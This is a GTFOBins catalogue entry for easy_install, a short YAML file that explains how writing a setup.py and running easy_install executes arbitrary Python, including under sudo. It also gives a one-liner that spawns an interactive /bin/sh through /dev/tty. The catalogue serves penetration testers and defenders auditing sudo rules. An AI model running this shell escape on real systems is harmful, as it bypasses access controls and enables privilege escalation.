<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/easy_install -->
---
functions:
  inherit:
  - code: |-
      echo '...' >setup.py
      easy_install .
    comment: |-
      This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

      Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

      ```
      echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
      ```
    contexts:
      sudo:
      unprivileged:
    from: python
...
